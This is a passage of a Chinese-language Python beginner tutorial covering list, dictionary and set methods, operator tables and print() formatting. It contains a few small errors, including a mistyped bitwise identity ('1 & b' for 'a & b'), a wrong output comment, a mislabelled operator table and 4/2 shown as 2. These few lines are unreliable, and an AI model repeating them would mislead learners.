<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">索引求值</span><br><span class="line">l = [<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">2</span>])  <span class="comment"># 12</span></span><br><span class="line"><span class="built_in">print</span>(l[-<span class="number">1</span>]) <span class="comment"># 14</span></span><br><span class="line"> </span><br><span class="line">切片操作</span><br><span class="line">l = [<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">2</span>:<span class="number">5</span>])       <span class="comment">#[12, 13, 14]</span></span><br><span class="line"><span class="built_in">print</span>(l[-<span class="number">3</span>:-<span class="number">1</span>])     <span class="comment">#[12, 13]</span></span><br></pre></td></tr></table></figure>
<p><strong>列表内置方法</strong></p>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>作用</strong></th>
<th><strong>示例</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>append()</code></td>
<td>向列表追加元素</td>
<td><code>l.append(4)</code></td>
<td><code>l``：[1, 2, 3, 4]</code></td>
</tr>
<tr>
<td><code>insert()</code></td>
<td>向列表任意位置添加元素</td>
<td><code>l.insert(0,100)</code></td>
<td><code>l``：[100, 1, 2, 3]</code></td>
</tr>
<tr>
<td><code>extend(``）</code></td>
<td>向列表合并一个列表</td>
<td><code>l.extend([4,5,6])</code></td>
<td><code>l``：[1, 2, 3, 4, 5, 6]</code></td>
</tr>
<tr>
<td><code>pop()</code></td>
<td>根据索引删除列表元素</td>
<td><code>l.pop(1)</code></td>
<td><code>l``：[1, 3]</code></td>
</tr>
<tr>
<td><code>remove()</code></td>
<td>根据元素值删除列表元素</td>
<td><code>l.remove(1)</code></td>
<td><code>l``：[2, 3]</code></td>
</tr>
<tr>
<td><code>clear()</code></td>
<td>清空列表元素</td>
<td><code>l.clear()</code></td>
<td><code>l``：[]</code></td>
</tr>
<tr>
<td><code>sort()</code></td>
<td>排序（升序）</td>
<td><code>l.sort()</code></td>
<td><code>l``：[1,2,3]</code></td>
</tr>
<tr>
<td><code>reverse()</code></td>
<td>翻转列表</td>
<td><code>l.reverse()</code></td>
<td><code>l``：[3,2,1]</code></td>
</tr>
<tr>
<td><code>count()</code></td>
<td>元素重复的次数2是元素</td>
<td><code>l.count(2)</code></td>
<td><code>返回值：1</code></td>
</tr>
<tr>
<td><code>index()</code></td>
<td>查找元素对应索引</td>
<td><code>l.index(2)</code></td>
<td><code>返回值：1</code></td>
</tr>
</tbody>
</table>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        代码操作示例
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 01 列表元素增加操作：append insert extend</span></span><br><span class="line">l1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># append()：追加一个元素</span></span><br><span class="line">l1.append(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(l1)           <span class="comment"># [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># insert(): 插入，即在任意位置添加元素</span></span><br><span class="line">l1.insert(<span class="number">1</span>, <span class="number">100</span>)   <span class="comment"># 在索引1的位置添加元素100</span></span><br><span class="line"><span class="built_in">print</span>(l1)           <span class="comment"># [1, 100, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># extend()：扩展一个列表</span></span><br><span class="line">l2 = [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]</span><br><span class="line"><span class="comment"># l1.append(l2)</span></span><br><span class="line">l1.extend(l2)</span><br><span class="line"><span class="built_in">print</span>(l1)           <span class="comment">#[1, 100, 2, 3, 4, 20, 21, 22, 23]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 02 列表元素删除操作：pop，remove，clear</span></span><br><span class="line">l4 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按索引删除:pop,返回删除的元素</span></span><br><span class="line">ret = l4.pop(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line"><span class="built_in">print</span>(l4)            <span class="comment"># [10, 20, 30, 50]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按着元素值删除</span></span><br><span class="line">l4.remove(<span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(l4)            <span class="comment"># [10, 20, 50]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空列表</span></span><br><span class="line">l4.clear()</span><br><span class="line"><span class="built_in">print</span>(l4)            <span class="comment"># []</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 03 列表元素修改操作：</span></span><br><span class="line">l5 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#  将索引为1的值改为200</span></span><br><span class="line">l5[<span class="number">1</span>] = <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(l5)             <span class="comment"># [10, 200, 30, 40, 50]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将l5中的40改为400 , step1：查询40的索引 step2：将索引为i的值改为400</span></span><br><span class="line">i = l5.index(<span class="number">40</span>) <span class="comment">#  3</span></span><br><span class="line">l5[i] = <span class="number">400</span></span><br><span class="line"><span class="built_in">print</span>(l5)             <span class="comment"># [10, 20, 30, 400, 50]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 04 列表元素查询操作：index，sort</span></span><br><span class="line">l5.reverse()          <span class="comment"># 只是翻转 [50, 400, 30, 200, 10]</span></span><br><span class="line"><span class="built_in">print</span>(l5) <span class="comment"># []</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询某个元素的索引，比如30的索引</span></span><br><span class="line"><span class="built_in">print</span>(l5.index(<span class="number">30</span>))   <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 排序</span></span><br><span class="line">l5.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(l5)             <span class="comment"># [400, 200, 50, 30, 10]</span></span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="字典数据类型"><strong>字典数据类型</strong></h4>
<p>字典是python提供的唯一内键的映射（mapping type）数据类型，python使用{ }创建字典。</p>
<p>由于字典中每个元素都包含键（key）和值（value）两部分，因此在创建字典时，键和值之间使用英文冒号<code>:</code>分隔。相邻元素之间使用英文逗号,分隔，所有元素放在大括号 <code>&#123; &#125;</code> 中，字典的元素也叫成员，是一个键值对。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dictname = &#123;<span class="string">&#x27;key1&#x27;</span>:<span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>:<span class="string">&#x27;value2&#x27;</span>, ...&#125;</span><br></pre></td></tr></table></figure>
<p>同一字典中的各个键必须唯一，不能重复。</p>
<p>字典的键值对原本是无序的，但是在python3.6版本之后，字典默认做成有序的了。</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        代码操作示例
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;01&quot;</span>: <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;02&quot;</span>: <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;03&quot;</span>: <span class="string">&quot;wangwu&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(d, <span class="built_in">type</span>(d))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 01 查键值</span></span><br><span class="line"><span class="built_in">print</span>(d[<span class="string">&quot;01&quot;</span>],d[<span class="string">&quot;02&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 02 添加或修改键值对</span></span><br><span class="line"><span class="comment"># 注意：如果键存在，则是修改，否则是添加</span></span><br><span class="line">d[<span class="string">&quot;01&quot;</span>] = <span class="string">&quot;xiaoX&quot;</span>  <span class="comment"># 修改键的值</span></span><br><span class="line">d[<span class="string">&quot;04&quot;</span>] = <span class="string">&quot;zhaoliu&quot;</span>  <span class="comment"># 添加键值对</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 03 删除键值对</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">del</span> d[<span class="string">&quot;01&quot;</span>]  <span class="comment"># 删除字典指定成员信息 delete</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">del</span> d  <span class="comment"># 删除字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典成员过滤筛选：</span></span><br><span class="line">d = &#123;<span class="string">&quot;01&quot;</span>: <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;02&quot;</span>: <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;03&quot;</span>: <span class="string">&quot;wangwu&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;01&quot;</span> <span class="keyword">in</span> d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典数据信息遍历：</span></span><br><span class="line">d = &#123;<span class="string">&quot;01&quot;</span>: <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;02&quot;</span>: <span class="string">&quot;lisi&quot;</span>, <span class="string">&quot;03&quot;</span>: <span class="string">&quot;wangwu&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d:</span><br><span class="line">    <span class="built_in">print</span>(key, d[key],<span class="string">&quot;||&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment"># 执行结果</span></span><br><span class="line">&#123;<span class="string">&#x27;01&#x27;</span>: <span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;02&#x27;</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;03&#x27;</span>: <span class="string">&#x27;wangwu&#x27;</span>&#125; &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">zhangsan lisi</span><br><span class="line">&#123;<span class="string">&#x27;01&#x27;</span>: <span class="string">&#x27;xiaoX&#x27;</span>, <span class="string">&#x27;02&#x27;</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;03&#x27;</span>: <span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;04&#x27;</span>: <span class="string">&#x27;zhaoliu&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;01&#x27;</span>: <span class="string">&#x27;xiaoX&#x27;</span>, <span class="string">&#x27;02&#x27;</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;03&#x27;</span>: <span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;04&#x27;</span>: <span class="string">&#x27;zhaoliu&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;02&#x27;</span>: <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;03&#x27;</span>: <span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;04&#x27;</span>: <span class="string">&#x27;zhaoliu&#x27;</span>&#125;</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">01 zhangsan || 02 lisi || 03 wangwu || </span><br></pre></td></tr></table></figure>

    </div>
</div>
<p><strong>字典内置的方法</strong></p>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>作用</strong></th>
<th><strong>示例</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>get()</code></td>
<td>查询字典键值，取不到返回默认值</td>
<td><code>d.get(&quot;name&quot;,None)</code></td>
<td><code>&quot;zkrc&quot;</code></td>
</tr>
<tr>
<td><code>setdefault()</code></td>
<td>查询字典某键的值，取不到给字典设置键值，同时返回设置的值</td>
<td><code>d.setdefault(&quot;age&quot;,20)</code></td>
<td><code>18</code></td>
</tr>
<tr>
<td><code>keys()</code></td>
<td>查询字典中所有的键</td>
<td><code>d.keys()</code></td>
<td><code>['name','age']</code></td>
</tr>
<tr>
<td><code>values()</code></td>
<td>查询字典中所有的值</td>
<td><code>d.values()</code></td>
<td><code>['zkrc', 18]</code></td>
</tr>
<tr>
<td><code>items()</code></td>
<td>查询字典中所有的键和值</td>
<td><code>d.items()</code></td>
<td><code>[('name','zkrc'),`` ('age', 18)]</code></td>
</tr>
<tr>
<td><code>pop()</code></td>
<td>删除字典<strong>指定</strong>的键值对</td>
<td><code>d.pop(</code>“age”<code>)</code></td>
<td><code>&#123;'name':'zkrc'&#125;</code></td>
</tr>
<tr>
<td><code>popitem()</code></td>
<td>删除字典<strong>最后</strong>的键值对</td>
<td><code>d.popitem()</code></td>
<td><code>&#123;'name':'zkrc'&#125;</code></td>
</tr>
<tr>
<td><code>clear()</code></td>
<td><strong>清空</strong>字典</td>
<td><code>d.clear()</code></td>
<td><code>&#123;&#125;</code></td>
</tr>
<tr>
<td><code>update()</code></td>
<td>更新字典</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        代码操作示例
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dic = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;zkrc&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">22</span>, <span class="string">&quot;sex&quot;</span>: <span class="string">&quot;male&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 01. 查字典的键的值</span></span><br><span class="line">name = dic.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">sex = dic.get(<span class="string">&quot;sex&quot;</span>, <span class="string">&quot;female&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(sex)</span><br><span class="line"><span class="built_in">print</span>(dic.keys())     <span class="comment"># 返回值：[&#x27;name&#x27;, &#x27;age&#x27;, &#x27;sex&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(dic.values())   <span class="comment"># 返回值：[&#x27;zkrc&#x27;, 22, &#x27;male&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(dic.items())    <span class="comment"># [(&#x27;name&#x27;, &#x27;zkrc&#x27;), (&#x27;age&#x27;, 22), (&#x27;sex&#x27;, &#x27;male&#x27;)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setdefault取某键的值，如果能取到，则返回该键的值，如果没有该键，则会设置键值对</span></span><br><span class="line"><span class="built_in">print</span>(dic.setdefault(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(dic.setdefault(<span class="string">&quot;height&quot;</span>, <span class="string">&quot;180cm&quot;</span>))  <span class="comment"># get()不会添加键值对 ，setdefault会添加</span></span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;, &#x27;age&#x27;: 22, &#x27;sex&#x27;: &#x27;male&#x27;, &#x27;height&#x27;: &#x27;180cm&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 02. 删除键值对 pop popitem</span></span><br><span class="line">sex = dic.pop(<span class="string">&quot;sex&quot;</span>)  <span class="comment"># male</span></span><br><span class="line"><span class="built_in">print</span>(sex)            <span class="comment"># male</span></span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;, &#x27;age&#x27;: 22&#125;</span></span><br><span class="line"></span><br><span class="line">dic.popitem()  <span class="comment"># 删除最后一个键值对</span></span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">dic.clear()           <span class="comment"># 清空键值对</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 03. 添加或修改 update</span></span><br><span class="line">add_dic = &#123;<span class="string">&quot;height&quot;</span>: <span class="string">&quot;180cm&quot;</span>, <span class="string">&quot;weight&quot;</span>: <span class="string">&quot;60kg&quot;</span>&#125;</span><br><span class="line">dic.update(add_dic)</span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;, &#x27;age&#x27;: 22, &#x27;sex&#x27;: &#x27;male&#x27;, &#x27;height&#x27;: &#x27;180cm&#x27;, &#x27;weight&#x27;: &#x27;60kg&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">update_dic = &#123;<span class="string">&quot;age&quot;</span>: <span class="number">33</span>, <span class="string">&quot;height&quot;</span>: <span class="string">&quot;180cm&quot;</span>, <span class="string">&quot;weight&quot;</span>: <span class="string">&quot;60kg&quot;</span>&#125;</span><br><span class="line">dic.update(update_dic)</span><br><span class="line"><span class="built_in">print</span>(dic)            <span class="comment"># &#123;&#x27;name&#x27;: &#x27;zkrc&#x27;, &#x27;age&#x27;: 33, &#x27;sex&#x27;: &#x27;male&#x27;, &#x27;height&#x27;: &#x27;180cm&#x27;, &#x27;weight&#x27;: &#x27;60kg&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 04. 字典的循环</span></span><br><span class="line">dic = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;zkrc&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">22</span>, <span class="string">&quot;sex&quot;</span>: <span class="string">&quot;male&quot;</span>&#125;</span><br><span class="line"><span class="comment"># 遍历键值对方式1</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:       <span class="comment"># 将每个键分别赋值给key</span></span><br><span class="line">     <span class="built_in">print</span>(key, dic.get(key))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历键值对儿方式2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic.items(): <span class="comment"># [(&#x27;name&#x27;, &#x27;zkrc&#x27;), (&#x27;age&#x27;, 22), (&#x27;sex&#x27;, &#x27;male&#x27;)]</span></span><br><span class="line">     <span class="built_in">print</span>(i[<span class="number">0</span>],i[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="集合数据类型"><strong>集合数据类型</strong></h4>
<p>Python 中的集合，和数学中的集合概念一样，由不同可hash的不重复的元素组成的集合。</p>
<p>Python 集合会将所有元素放在一对大括号 {} 中，相邻元素之间用“,”分隔。</p>
<p>同一集合中，只能存储不可变的数据类型，包括整形、浮点型、字符串、元组，无法存储列表、字典、集合这些可变的数据类型，否则 Python 解释器会抛出 TypeError错误。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;element1,element2,...&#125;</span><br></pre></td></tr></table></figure>
<p>说明：由于集合中的元素是无序的，因此无法向列表那样使用下标访问元素，访问集合元素最常用的方法是使用循环结构；</p>
<p><strong>集合内置方法</strong></p>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>作用</strong></th>
<th><strong>示例</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>add()</code></td>
<td>向集合添加元素</td>
<td><code>a.add(4)</code></td>
<td><code>&#123;1, 2, 3, 4&#125;</code></td>
</tr>
<tr>
<td><code>update()</code></td>
<td>向集合更新一个集合</td>
<td><code>a.update(&#123;3,4,5&#125;) </code></td>
<td><code>&#123;1, 3, 4, 5&#125;</code></td>
</tr>
<tr>
<td><code>remove()</code></td>
<td>删除集合中的元素</td>
<td><code>a.remove(2)</code></td>
<td><code>&#123;1, 3&#125;</code></td>
</tr>
<tr>
<td><code>discard()</code></td>
<td>删除集合中的元素</td>
<td><code>a.discard(2)</code></td>
<td><code>&#123;1, 3&#125;</code></td>
</tr>
<tr>
<td><code>pop()</code></td>
<td>删除集合第一个元素</td>
<td><code>a.pop()</code></td>
<td><code>&#123;2,3&#125;</code></td>
</tr>
<tr>
<td><code>clear()</code></td>
<td>清空集合</td>
<td><code>a.clear()</code></td>
<td><code>&#123;&#125;</code></td>
</tr>
<tr>
<td><code>intersection()</code></td>
<td>返回两个集合的交集</td>
<td><code>a.intersection(b)</code></td>
<td><code>&#123;3&#125;</code></td>
</tr>
<tr>
<td><code>difference()</code></td>
<td>返回两个集合的差集</td>
<td><code>a.difference(b)</code><br><code>b.difference(a)</code></td>
<td><code>&#123;1,2&#125;</code><br><code>&#123;4,5&#125;</code></td>
</tr>
<tr>
<td><code>symmetric_difference()</code></td>
<td>返回两个集合的对称差集</td>
<td><code>a.symmetric_difference(b)</code></td>
<td><code>&#123;1, 2, 4, 5&#125;</code></td>
</tr>
<tr>
<td><code>union()</code></td>
<td>返回两个集合的并集</td>
<td><code>a.union(b)</code></td>
<td><code>&#123;1, 2, 3, 4, 5&#125;</code></td>
</tr>
</tbody>
</table>
<h2 id="运算符号介绍">运算符号介绍</h2>
<h3 id="数运算符说明">数运算符说明</h3>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>加</td>
<td>1+1</td>
<td>2</td>
</tr>
<tr>
<td>-</td>
<td>减</td>
<td>1-1</td>
<td>0</td>
</tr>
<tr>
<td>*</td>
<td>乘</td>
<td>1*3</td>
<td>3</td>
</tr>
<tr>
<td>/</td>
<td>除法</td>
<td>4/2</td>
<td>2</td>
</tr>
<tr>
<td>//</td>
<td>整除</td>
<td>7 // 2</td>
<td>3</td>
</tr>
<tr>
<td>%</td>
<td>取余，求模，即返回除法的余数</td>
<td>7 % 2</td>
<td>1</td>
</tr>
<tr>
<td>**</td>
<td>幂运算/次方运算</td>
<td>2 ** 4</td>
<td>16</td>
</tr>
<tr>
<td>|</td>
<td>或</td>
<td>5|3</td>
<td>7</td>
</tr>
<tr>
<td>&amp;</td>
<td>与</td>
<td>5&amp;3</td>
<td>1</td>
</tr>
<tr>
<td>^</td>
<td>异或</td>
<td>5^3</td>
<td>6</td>
</tr>
</tbody>
</table>
<p><font class="notice">Tips：事实上，a | b=(1 &amp; b)+(a ^ b)</font></p>
<h3 id="位运算符说明">位运算符说明</h3>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>说 明</strong></th>
<th><strong>用法举例</strong></th>
<th><strong>等价形式</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>赋值</td>
<td>x = y</td>
<td>x = y</td>
</tr>
<tr>
<td>+=</td>
<td>加赋值</td>
<td>x += y</td>
<td>x = x + y</td>
</tr>
<tr>
<td>-=</td>
<td>减赋值</td>
<td>x -= y</td>
<td>x = x - y</td>
</tr>
<tr>
<td>*=</td>
<td>乘赋值</td>
<td>x *= y</td>
<td>x = x * y</td>
</tr>
<tr>
<td>/=</td>
<td>除赋值</td>
<td>x /= y</td>
<td>x = x / y</td>
</tr>
<tr>
<td>%=</td>
<td>取余数赋值</td>
<td>x %= y</td>
<td>x = x % y</td>
</tr>
<tr>
<td>**=</td>
<td>幂赋值</td>
<td>x **= y</td>
<td>x = x ** y</td>
</tr>
<tr>
<td>//=</td>
<td>取整数赋值</td>
<td>x //= y</td>
<td>x = x // y</td>
</tr>
<tr>
<td>&amp;=</td>
<td>按位与赋值</td>
<td>x &amp;= y</td>
<td>x = x &amp; y</td>
</tr>
<tr>
<td>|=</td>
<td>按位或赋值</td>
<td>x |= y</td>
<td>x = x | y</td>
</tr>
<tr>
<td>^=</td>
<td>按位异或赋值</td>
<td>x ^= y</td>
<td>x = x ^ y</td>
</tr>
<tr>
<td>&lt;&lt;=</td>
<td>左移赋值</td>
<td>x «= y</td>
<td>x = x &lt;&lt; y， y 指左移位数</td>
</tr>
<tr>
<td>&gt;&gt;=</td>
<td>右移赋值</td>
<td>x »= y</td>
<td>x = x &gt;&gt; y， y 指右移位数</td>
</tr>
</tbody>
</table>
<h3 id="比较运算符说明">比较运算符说明</h3>
<table>
<thead>
<tr>
<th><strong>比较运算符</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>==</td>
<td>等于</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于（等价于数学中的 ≥）</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于（等价于数学中的 ≤）</td>
</tr>
<tr>
<td>!=</td>
<td>不等于（等价于数学中的 ≠）</td>
</tr>
<tr>
<td>is</td>
<td>判断两个变量所引用的对象是否相同</td>
</tr>
<tr>
<td>is not</td>
<td>判断两个变量所引用的对象是否不相同</td>
</tr>
</tbody>
</table>
<h3 id="逻辑运算符说明">逻辑运算符说明</h3>
<table>
<thead>
<tr>
<th><strong>逻辑运算符</strong></th>
<th><strong>含义</strong></th>
<th><strong>基本格式</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>and</td>
<td>与运算</td>
<td>x and y</td>
<td>当x和y都为真时结果才为真。</td>
</tr>
<tr>
<td>or</td>
<td>或运算</td>
<td>x or y</td>
<td>当x和y都为假时结果才是假。</td>
</tr>
<tr>
<td>not</td>
<td>非运算</td>
<td>not y</td>
<td>对x的结果取相反的结果。</td>
</tr>
</tbody>
</table>
<h3 id="成员运算符说明">成员运算符说明</h3>
<p>in和not in用于测试给定数据是否存在于序列（如列表、字符串）中：</p>
<p>in作用是，如果指定字符在字符串中，则返回True，否则返回False。not in的作用刚好相反。</p>
<p>编写运算符应用示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="string">&quot;zkrc&quot;</span></span><br><span class="line">y=<span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="built_in">print</span>(y <span class="keyword">in</span> x)</span><br><span class="line"><span class="built_in">print</span>(y <span class="keyword">not</span> <span class="keyword">in</span> x)</span><br><span class="line"><span class="comment"># 运行结果</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
<h2 id="输入输出应用">输入输出应用</h2>
<h3 id="输入输出函数说明">输入输出函数说明</h3>
<h4 id="print-函数">print()函数</h4>
<p>print()函数用于打印内容或变量等输出，是python中最最用的函数。</p>
<p>函数语法格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(value1, ..., sep=<span class="string">&#x27; &#x27;</span>, end=<span class="string">&#x27;\n&#x27;</span>, file=sys.stdout,flush=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>函数参数信息：</p>
<table>
<thead>
<tr>
<th><strong>序号</strong></th>
<th><strong>函数参数</strong></th>
<th><strong>解释说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td>value</td>
<td>打印的对象，之间用逗号分隔</td>
</tr>
<tr>
<td>02</td>
<td>sep</td>
<td>打印的两个值之间的分隔符，默认是空格</td>
</tr>
<tr>
<td>03</td>
<td>end</td>
<td>打印输出以什么结尾，默认是换行符\n</td>
</tr>
<tr>
<td>04</td>
<td>file</td>
<td>输出的文件对象，默认是sys.stdout，标准输出</td>
</tr>
<tr>
<td>05</td>
<td>flush</td>
<td>表示要强制冲洗流（忽略）</td>
</tr>
</tbody>
</table>
<p>print() 函数使用以%开头的转换说明符对各种类型的数据进行格式化输出，具体请看下表：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>类型</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%s</code></td>
<td>字符串</td>
<td><code>&quot;Hello %s&quot; % &quot;World&quot;</code></td>
</tr>
<tr>
<td><code>%d</code></td>
<td>整数</td>
<td><code>&quot;Age: %d&quot; % 25</code></td>
</tr>
<tr>
<td><code>%f</code>、<code>%F</code></td>
<td>浮点数</td>
<td><code>&quot;Price: %.2f&quot; % 99.876</code> → <code>99.88</code></td>
</tr>
<tr>
<td><code>%x</code></td>
<td>十六进制整数</td>
<td><code>&quot;Hex: %x&quot; % 255</code> → <code>ff</code></td>
</tr>
<tr>
<td><code>%%</code></td>
<td>百分号本身</td>
<td><code>&quot;Discount: 10%%&quot;</code></td>
</tr>
</tbody>
</table>
<p>代码操作示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Corazon&quot;</span></span><br><span class="line">sex = <span class="string">&quot;Male&quot;</span></span><br><span class="line">age = <span class="number">24</span></span><br><span class="line"><span class="built_in">print</span>(name, sex, sep=<span class="string">&quot;:&quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(age)  <span class="comment"># Corazon:Male 24  与上行合并为同一行</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;你的名字是:&quot;</span>, name, <span class="string">&quot;你的性别：&quot;</span>, sex, <span class="string">&quot;你的年龄&quot;</span>, age)  <span class="comment"># 你的名字是: Corazon 你的性别： Male 你的年龄 24</span></span><br><span class="line"><span class="comment"># 解决空格问题</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;你的名字是:&quot;</span>, name, <span class="string">&quot; 你的性别：&quot;</span>, sex, <span class="string">&quot; 你的年龄&quot;</span>, age, sep=<span class="string">&#x27;&#x27;</span>)  <span class="comment"># 你的名字是:Corazon 你的性别：Male 你的年龄24</span></span><br><span 